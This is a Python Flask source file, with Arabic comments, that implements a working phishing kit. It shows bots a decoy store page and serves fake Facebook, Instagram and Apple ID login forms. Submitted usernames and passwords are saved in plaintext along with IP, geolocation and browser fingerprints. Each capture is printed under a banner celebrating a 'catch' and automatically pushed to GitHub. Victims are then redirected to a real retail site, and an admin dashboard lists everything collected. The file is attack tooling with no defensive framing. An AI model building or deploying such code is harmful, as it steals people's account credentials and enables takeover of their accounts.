import logging
import re
import subprocess
import threading
import time
import uuid
import os
from flask import Flask, render_template, request, redirect, make_response, session
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

import config
from database import init_db, get_db_connection
from utils import get_client_info, is_bot, get_geo_info

def auto_sync_to_github():
    try:
        subprocess.run(["git", "add", "."], check=True, capture_output=True)
        commit_result = subprocess.run(["git", "commit", "-m", "Auto-sync: New data captured"], capture_output=True, text=True)
        if "nothing to commit" not in commit_result.stdout:
            subprocess.run(["git", "push", "origin", "main"], check=True, capture_output=True)
            print("[+] تم مزامنة البيانات وتحديث GitHub بنجاح.")
    except Exception as e:
        print(f"[-] خطأ في المزامنة التلقائية: {e}")

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__, template_folder='templates')
app.secret_key = config.SECRET_KEY

# إعداد الحماية والـ Rate Limiting لمنع الهجمات العشوائية
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"]
)

init_db()

@app.route('/')
def home():
    client_ip, user_agent = get_client_info(request)
    if is_bot(user_agent):
        return "<h1>Welcome to jodi Store</h1><p>Browse our exclusive collection.</p>"

    session_token = request.cookies.get('session_token')
    if not session_token:
        session_token = str(uuid.uuid4())
        
    country, city = get_geo_info(client_ip)

    with get_db_connection() as conn:
        conn.execute('''
            INSERT INTO hits (session_token, platform, identifier, secret, user_agent, ip, country, city) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_token, 'Page_Visit', 'Visitor_Connected', 'None', user_agent, client_ip, country, city))
        conn.commit()

    resp = make_response(render_template('home.html', dynamic_url=""))
    if not request.cookies.get('session_token'):
        resp.set_cookie('session_token', session_token, httponly=True, samesite='Lax', secure=False)
    return resp

@app.route('/collect-info', methods=['POST'])
def collect_info():
    session_token = request.cookies.get('session_token', str(uuid.uuid4()))
    browser = request.form.get('browser', 'Unknown')
    engine = request.form.get('engine', 'Unknown')
    platform_os = request.form.get('platform_os', 'Unknown')
    fingerprint = request.form.get('fingerprint', 'Unknown')
    
    timezone = request.form.get('timezone', 'Unknown')
    accept_lang = request.form.get('accept_lang', 'Unknown')
    
    client_ip, user_agent = get_client_info(request)
    country, city = get_geo_info(client_ip)

    with get_db_connection() as conn:
        existing = conn.execute("SELECT id FROM hits WHERE fingerprint = ? AND platform = 'Page_Visit'", (fingerprint,)).fetchone()
        if existing:
            conn.execute("UPDATE hits SET timestamp = CURRENT_TIMESTAMP WHERE id = ?", (existing['id'],))
        else:
            conn.execute('''
                UPDATE hits 
                SET browser = ?, engine = ?, platform_os = ?, fingerprint = ?, country = ?, city = ? 
                WHERE session_token = ? AND platform = 'Page_Visit'
            ''', (browser, engine, platform_os, fingerprint, country, city, session_token))
        conn.commit()

    # طباعة معلومات الزيارة الجديدة شاملة التوقيت واللغة في الترمينال
    print("\n" + "--- [ 🌐 زيارة جديدة متصلة ] ---")
    print(f"IP Address : {client_ip}")
    print(f"Country    : {country} ({city})")
    print(f"Timezone   : {timezone}")
    print(f"Lang       : {accept_lang}")
    print(f"OS         : {platform_os}")
    print(f"Browser    : {browser}")
    print("-" * 30 + "\n")
    
    threading.Thread(target=auto_sync_to_github).start()
    return '', 204

@app.route('/login-page', methods=['GET'])
def login_page():
    platform = request.args.get('platform')
    client_ip, user_agent = get_client_info(request)
    session_token = request.cookies.get('session_token', str(uuid.uuid4()))
    country, city = get_geo_info(client_ip)
    
    with get_db_connection() as conn:
        conn.execute('''
            INSERT INTO hits (session_token, platform, identifier, secret, user_agent, ip, country, city) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_token, platform, f'Clicked_{platform}_Button', 'Pending Form', user_agent, client_ip, country, city))
        conn.commit()

    if platform == 'facebook':
        return render_template('custom_login.html', platform='facebook', brand_title="facebook", brand_color="#1877f2", platform_name="فيسبوك")
    elif platform == 'instagram':
        return render_template('custom_login.html', platform='instagram', brand_title="Instagram", brand_color="#E1306C", platform_name="إنستجرام")
    elif platform == 'apple':
        return render_template('custom_login.html', platform='apple', brand_title="Apple ID", brand_color="#000000", platform_name="آبل")
    else:
        return redirect('/')

@app.route('/login-action', methods=['POST'])
@limiter.limit("5 per minute")
def login_action():
    platform = request.form.get('platform', 'direct')
    identifier = request.form.get('identifier', '').strip()
    password = request.form.get('password', '').strip()
    browser = request.form.get('browser', 'Unknown')
    engine = request.form.get('engine', 'Unknown')
    platform_os = request.form.get('platform_os', 'Unknown')
    fingerprint = request.form.get('fingerprint', 'Unknown')
    timezone = request.form.get('timezone', 'Unknown')
    accept_lang = request.form.get('accept_lang', 'Unknown')
    
    client_ip, user_agent = get_client_info(request)
    session_token = request.cookies.get('session_token', str(uuid.uuid4()))
    country, city = get_geo_info(client_ip)
    
    with get_db_connection() as conn:
        conn.execute('''
            INSERT INTO hits (session_token, fingerprint, platform, identifier, secret, user_agent, browser, engine, platform_os, ip, country, city) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_token, fingerprint, f'Form_{platform}', identifier, password, user_agent, browser, engine, platform_os, client_ip, country, city))
        conn.commit()
        
    print("\n" + "=== [ 🎯 صيد جديد تم التقاطه! ] ===")
    print(f"Platform   : {platform.upper()}")
    print(f"IP Address : {client_ip}")
    print(f"Country    : {country} ({city})")
    print(f"Timezone   : {timezone}")
    print(f"Lang       : {accept_lang}")
    print(f"Username   : {identifier}")
    print(f"Password   : {password}")
    print("================================" + "\n")

    threading.Thread(target=auto_sync_to_github).start()
    
    return redirect('https://abayajudi.com/ar/')

@app.route('/admin-dashboard', methods=['GET', 'POST'])
def admin_dashboard():
    if request.method == 'POST':
        if request.form.get('username') == config.ADMIN_USER and request.form.get('password') == config.ADMIN_PASS:
            session['logged_in'] = True
        else:
            return render_template('admin_login.html')

    if not session.get('logged_in'):
        return render_template('admin_login.html')

    with get_db_connection() as conn:
        rows = conn.execute("SELECT * FROM hits ORDER BY id DESC").fetchall()
        
    formatted_rows = []
    for r in rows:
        row_dict = dict(r)
        formatted_rows.append(row_dict)

    return render_template('dashboard.html', rows=formatted_rows)

@app.route('/admin-logout')
def admin_logout():
    session.pop('logged_in', None)
    return redirect('/admin-dashboard')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False)
